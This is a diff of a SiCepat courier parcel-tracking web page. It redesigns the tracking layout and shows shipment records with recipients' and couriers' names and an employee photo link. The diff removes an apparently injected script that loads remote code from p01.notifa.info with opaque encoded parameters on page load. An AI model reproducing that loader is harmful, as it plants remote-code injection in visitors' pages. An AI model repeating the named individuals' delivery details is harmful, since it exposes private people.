@@ -17,7 +17,7 @@
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/app.min.css">
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/skin/_all-skins.min.css">
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/wapp.css?v=10">
-	<link rel="stylesheet" type="text/css" href="http://sicepat.com/application/websicepat/assets/css/index.css?v=9">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/application/websicepat/assets/css/index.css">
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/slick/slick.css">
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/slick/slick-theme.css">
 	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/jquery-cslider/css/style.css">
@@ -63,13 +63,10 @@
 									<li class=""><a href="http://sicepat.com/home">HOME</a></li>
 									<li class="active"><a href="http://sicepat.com/checkAwb">CEK RESI</a></li>
 									<li class=""><a href="http://sicepat.com/deliveryFee">ONGKIR</a></li>
+									<li class=""><a href="http://sicepat.com/news">NEWS</a></li>
 									<li class=""><a href="http://sicepat.com/service">SERVICE</a></li>
 									<li class=""><a href="http://sicepat.com/location">LOKASI</a></li>
 									<li class=""><a href="http://sicepat.com/contactus">CONTACT</a></li>
-									<!-- <li class=""><a href="http://sicepat.com/promo">PROMO</a></li>
-                                    <li class=""><a href="http://sicepat.com/career">KARIR</a></li> -->
-									<!--<li class=""><a href="">PROMO</a></li>-->
-									<!--<li class=""><a href="">KARIR</a></li>-->
 								</ul>
 							</div>
 						</nav>
@@ -84,25 +81,11 @@
 									<li class=""><a href="http://sicepat.com/home">HOME</a></li>
 									<li class="active"><a href="http://sicepat.com/checkAwb">CEK RESI</a></li>
 									<li class=""><a href="http://sicepat.com/deliveryFee">ONGKIR</a></li>
+									<li class=""><a href="http://sicepat.com/news">NEWS</a></li>
 									<li class=""><a href="http://sicepat.com/service">SERVICE</a></li>
-									<!-- <li class=" dropdown">
-                                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" onclick="redirect('http://sicepat.com/service')">SERVICE <span class="caret"></span></a>
-                                        <ul class="dropdown-menu">
-                                            <li><a href="http://sicepat.com/service/detail">REG</a></li>
-                                            <li><a href="http://sicepat.com/service/detail/1">BEST</a></li>
-                                            <li><a href="http://sicepat.com/service/detail/2">CARGO</a></li>
-                                            <li><a href="http://sicepat.com/service/detail/3">Cash On Delivery</a></li>
-                                        </ul>
-                                    </li> -->
 									<li class=""><a href="http://sicepat.com/location">LOKASI</a></li>
 									<li class=""><a href="http://sicepat.com/contactus">CONTACT</a></li>
-									<!-- <li class=""><a href="http://sicepat.com/promo">PROMO</a></li>
-                                    <li class=""><a href="http://sicepat.com/career">KARIR</a></li> -->
 
-									<!--<li class=""><a class="link-contact-us" href="">CONTACT US</a></li>-->
-
-									<!--<li class=""><a href=""></a></li>-->
-									<!--<li class=""><a href=""></a></li>-->
 								</ul>
 							</div>
 						</nav>
@@ -209,82 +192,285 @@
 							<tbody>
 								<tr class="res-item">
 									<td class="hidden-xs">1</td>
-									<td>123456789012<div class="visible-xs">REG<br>(1 - 2 Hari)</div>
+									<td>123456789012<div class="visible-xs">REG<br>(3 - 5 Hari)</div>
 									</td>
-									<td class="hidden-xs">REG<br>(1 - 2 Hari)</td>
-									<td>SUKOLILO, KOTA SURABAYA<div class="visible-xs">Penerima: KEVIN ISKANDAR</div>
+									<td class="hidden-xs">REG<br>(3 - 5 Hari)</td>
+									<td>KETAPANG, KAB. KETAPANG<div class="visible-xs">Penerima: YULIANTI MUTIARA</div>
 									</td>
-									<td class="hidden-xs">KEVIN ISKANDAR</td>
-									<td>05-FEB-2020<div class="visible-xs">Penerima Paket: PAKET DITERIMA OLEH [KEVIN -
-											(YBS) YANG BERSANGKUTAN]</div>
+									<td class="hidden-xs">YULIANTI MUTIARA</td>
+									<td>04-MAY-2020<div class="visible-xs">Penerima Paket: PAKET DITERIMA OLEH [YAYUK -
+											(KEL) KELUARGA SERUMAH]</div>
 									</td>
-									<td class="hidden-xs">PAKET DITERIMA OLEH [KEVIN - (YBS) YANG BERSANGKUTAN]</td>
+									<td class="hidden-xs">PAKET DITERIMA OLEH [YAYUK - (KEL) KELUARGA SERUMAH]</td>
 									<td>DELIVERED</td>
 								</tr>
 								<tr class="res-detail">
 									<td colspan="8">
-										<div class="detail-title">TRACKING DETAILS</div>
 										<div class="row">
-											<div class="col-md-5 col-sm-6">
-												<table class="table ws-table">
-													<tr>
-														<th>Tgl Pengiriman</th>
-														<th>Asal</th>
-														<th>Tujuan</th>
-													</tr>
-													<tr>
-														<td>04-Feb-2020 17:08</td>
-														<td>JAKARTA SELATAN</td>
-														<td>SUKOLILO, KOTA SURABAYA</td>
-													</tr>
-												</table>
-												<table class="table ws-table">
-													<tr>
-														<th>Pengirim</th>
-														<th>Penerima</th>
-													</tr>
-													<tr>
-														<td>CHARIS INDONESIA</td>
-														<td>KEVIN ISKANDAR</td>
-													</tr>
-													<tr>
-														<td>JAKARTA SELATAN</td>
-														<td>SUKOLILO, KOTA SURABAYA</td>
-													</tr>
-												</table>
+											<div class="col-lg-7">
+												<div class="detail-title">TRACKING DETAILS</div>
+												<div class="track-awb-card w-100">
+													<div class="flex flex-column">
+														<div class="track-awb-detail flex flex-row">
+															<div class="track-awb-detail-item flex flex-column">
+																<div class="track-awb-detail-item-label track-awb-date flex flex-column"
+																	style="width:125px">
+																	<h5>Tanggal Pengiriman</h5>
+																	<p>27-Apr-2020 17:02</p>
+																</div>
+																<div
+																	class="track-awb-detail-item-label flex flex-column mb-0">
+																	<h5>Pengirim</h5>
+																	<p>CHARIS</p>
+																	<p>DKI Jakarta</p>
+																</div>
+															</div>
+															<div class="track-awb-detail-item flex flex-column">
+																<div
+																	class="track-awb-detail-item-label flex flex-column">
+																	<h5>Asal</h5>
+																	<p>DKI Jakarta</p>
+																</div>
+																<div
+																	class="track-awb-detail-item-label flex flex-column mb-0">
+																	<h5>Penerima</h5>
+																	<p>Yulianti Mutiara</p>
+																	<p>Ketapang, Kab. Ketapang</p>
+																</div>
+															</div>
+															<div class="track-awb-detail-item flex flex-column">
+																<h5>Tujuan</h5>
+																<p>Ketapang, Kab. Ketapang</p>
+															</div>
+														</div>
+													</div>
+													<hr />
+													<div class="track-awb-img flex flex-row">
+														<div class="track-awb-img-item flex flex-column">
+															<h5>Sigesit Pick Up</h5>
+															<p>-</p>
+														</div>
+														<div class="track-awb-img-item flex flex-column">
+															<h5>Sigesit Antar</h5> <img src="https://sicepatmasterdata.s3.ap-southeast-1.amazonaws.com/images/employee/19121647.jpg" alt="sigesit"/>
+															<p class="sigesit-name"> Rohmat Hidayat </p>
+														</div>
+													</div>
+												</div>
 											</div>
-											<div class="col-md-5 col-md-offset-2 col-sm-6">
-												<table class="table ws-table">
-													<tr>
-														<th colspan="2">History</th>
-													</tr>
-													<tr>
-														<td>04-02-2020 17:08</td>
-														<td>PAKET TELAH DI INPUT (MANIFESTED) DI JAKARTA SELATAN [JAKSEL
-															CIPETE]</td>
-													</tr>
-													<tr>
-														<td>04-02-2020 22:31</td>
-														<td>PAKET KELUAR DARI DKI JAKARTA [JAKSEL CIPETE]</td>
-													</tr>
-													<tr>
-														<td>04-02-2020 23:58</td>
-														<td>PAKET TELAH DI TERIMA DI JAKARTA UTARA [JAKUT PLUIT 1 HUB]
-														</td>
-													</tr>
-													<tr>
-														<td>05-02-2020 15:47</td>
-														<td>PAKET TELAH DI TERIMA DI SURABAYA [SURABAYA MERR]</td>
-													</tr>
-													<tr>
-														<td>05-02-2020 19:24</td>
-														<td>PAKET DIBAWA [SIGESIT - ANDIKA INDRAGIRI WIDAGDO]</td>
-													</tr>
-													<tr>
-														<td>05-02-2020 19:24</td>
-														<td>PAKET DITERIMA OLEH [KEVIN - (YBS) YANG BERSANGKUTAN]</td>
-													</tr>
-												</table>
+											<div class="col-lg-5">
+												<div class="detail-title">HISTORY</div>
+												<div class="track-awb-card w-100">
+													<ul class="history-awb-timeline">
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>12:43</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Terima permintaan pick up dari [Charis]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>12:43</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Terima permintaan pick up dari [Charis]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>16:46</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Terima permintaan pick up dari [Charis]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>16:23</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket gagal di pick up oleh [SIGESIT - Muhammad
+																		Safei]. Ket: Barang Not Ready</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>17:02</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di input (manifested) di Jakarta
+																		Selatan [Jaksel Cipete]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>27-Apr-2020</h5>
+																	<p>23:50</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket keluar dari DKI Jakarta [Jaksel Cipete]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>28-Apr-2020</h5>
+																	<p>02:21</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di terima di Jakarta Utara [Jakut
+																		Pluit 5 Hub ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>29-Apr-2020</h5>
+																	<p>00:53</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket keluar dari Jakarta Utara [Jakut Pluit 5
+																		Hub ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>29-Apr-2020</h5>
+																	<p>00:53</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket keluar dari Jakarta Utara [Jakut Pluit 5
+																		Hub ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>01-May-2020</h5>
+																	<p>16:20</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di terima di Pontianak [Pontianak
+																		HUB]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>01-May-2020</h5>
+																	<p>16:28</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di terima di Pontianak [Pontianak
+																		HUB]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>02-May-2020</h5>
+																	<p>10:40</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di terima di Pontianak [Pontianak
+																		HUB]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>03-May-2020</h5>
+																	<p>11:09</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket telah di terima di [Pontianak Ketapang]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>03-May-2020</h5>
+																	<p>12:42</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket dibawa [SIGESIT - Rohmat Hidayat ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>03-May-2020</h5>
+																	<p>18:54</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket di kembalikan di [Pontianak Ketapang] -
+																		(AU) Antar Ulang</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>04-May-2020</h5>
+																	<p>08:34</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket dibawa [SIGESIT - Rohmat Hidayat ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>04-May-2020</h5>
+																	<p>08:34</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket dibawa [SIGESIT - Rohmat Hidayat ]</p>
+																</div>
+															</div>
+														</li>
+														<li>
+															<div class="flex flex-row">
+																<div class="history-date flex flex-column">
+																	<h5>04-May-2020</h5>
+																	<p>12:35</p>
+																</div>
+																<div class="history-detail flex flex-column">
+																	<p>Paket diterima oleh [Yayuk - (KEL) Keluarga
+																		Serumah]</p>
+																</div>
+															</div>
+														</li>
+													</ul>
+												</div>
 											</div>
 										</div>
 							</tbody>
@@ -389,7 +575,7 @@
 							<div class="row">
 								<div class="col-md-12 ws-footer-bottom">
 									<i class="fa fa-copyright"></i> 2018 PT. SiCepat Ekspres Indonesia. All rights
-									reserved. 2018 PT. SiCepat Ekspres Indonesia. All rights reserved.
+									reserved.
 								</div>
 							</div>
 						</div>
@@ -433,6 +619,7 @@
 				src="http://sicepat.com/assets/plugins/jquery-cslider/js/modernizr.custom.28468.js"></script>
 			<script type="text/javascript" src="http://sicepat.com/assets/plugins/jquery-cslider/js/jquery.cslider.js">
 			</script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/moment/moment.js"></script>
 			<script type="text/javascript" src="http://sicepat.com/assets/plugins/notify/notify.min.js"></script>
 			<script type="text/javascript">
 				$(document).ready(function() {
@@ -451,6 +638,13 @@
                                         radioClass: 'iradio_square-blue',
                                         increaseArea: '20%' // optional
                                     });},0);});jQuery("#new-resi").on("click", function(){    jQuery(".awb-input-field .row:last-child input").css("border-top",0);    jQuery(".awb-input-field .row:last-child .input-group-addon").css("border-top",0);    jQuery(".awb-input-field").append("   <div class='row new'>       <div class='col-md-3'></div>       <div class='col-md-6'>           <div class='input-group'>               <div class='input-group-addon'><img src='http://sicepat.com/application/websicepat/assets/img/doc@2x.png' style='width:17px; height:20px;'></div>               <input type='text' name='awb[]' class='form-control input-awb' placeholder='No resi' value=''><div class='input-group-addon trash'><i class='fa fa-trash fa-lg'></i></div>           </div>       </div>       <div class='col-md-3'></div>   </div>")});jQuery(document).on("click", ".trash i", function(){    jQuery(this).parents(".new").remove();});
+              jQuery("[data-toggle='popover']").popover({
+                html: true,
+                container: "body",
+                content: function () {
+                      return "<img src=" + $(this).data('img') + " style='width:150px' alt=" + $(this).data('sigesit') + "/>";
+                }
+              });   
               jQuery(".res-detail").hide();
               jQuery("#awb-list").on("click", ".res-item", function(){
                   if (jQuery(this).next().is(":visible")) {
@@ -460,12 +654,9 @@
                       jQuery(this).next().slideDown();
                   }
               });
-              $.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/js/google-analytics.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/jquery-2.1.1.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/icheck.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/jquery.dataTables.js?v=1]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.fixedHeader.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.responsive.2.0.2.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2.full.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootbox/bootboxbootstrap3.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/loading-overlay/loadingoverlay.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/app.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/wapp.js?v=6]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/modernizr.custom.28468.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/jquery.cslider.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/notify/notify.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/font-awesome-4.7.0/css/font-awesome.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/square/blue.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/responsive.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/fixedHeader.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2-4.0.0.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/app.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/skin/_all-skins.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/wapp.css?v=10]";$.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/css/index.css?v=9]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick-theme.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/css/style.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/hamburger/hamburger.css]";	});
+              $.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/js/google-analytics.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/jquery-2.1.1.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/icheck.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/jquery.dataTables.js?v=1]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.fixedHeader.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.responsive.2.0.2.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2.full.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootbox/bootboxbootstrap3.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/loading-overlay/loadingoverlay.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/app.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/wapp.js?v=6]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/modernizr.custom.28468.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/jquery.cslider.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/moment/moment.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/notify/notify.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/font-awesome-4.7.0/css/font-awesome.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/square/blue.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/responsive.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/fixedHeader.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2-4.0.0.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/app.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/skin/_all-skins.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/wapp.css?v=10]";$.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/css/index.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick-theme.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/css/style.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/hamburger/hamburger.css]";	});
 			</script>
 
-			<script type="text/javascript">
-				if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXc9L8T05s7tSQaDZNFYPYCUjjC3X16X7p0QPIsPsaaJJ%2bwiijqFKm6aVqExRuG3HTUNGDQat4fnqSAKlC6XCw7Qaf1Rf7PTo3WLJ79du8hBlq08HHn%2fn2HyekNymvzuSD%2fCYUDQ7VaDIzngLx5d9xkCgn0nBlf8CDjJNitp4OFys2oTPGX88rr2Z4OUgNwAXLo6ZxWIrha9X9kH2llaFSPjj0gY4MXnC1Moxlh%2bQEuuJcYkZJKyCxkcNrmyok2f7VtSVaIZIcAaxcp772nTi%2bEjqlhom15ME31pm%2bUJsDW%2fsL2VxMPcAm0t3LdC6zONz4VMsVibtrK6E9VHkwe4dEGiPwwrNlyWtuA0FnTqxIOmhcFXXPr52ZEDRgcb7btx6sWI%2bv%2funagRBSjXtvfQGxmMdHdsG1CecOnU%2fpyJIzw4E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
-			</script>
 </body>
 
 </html>
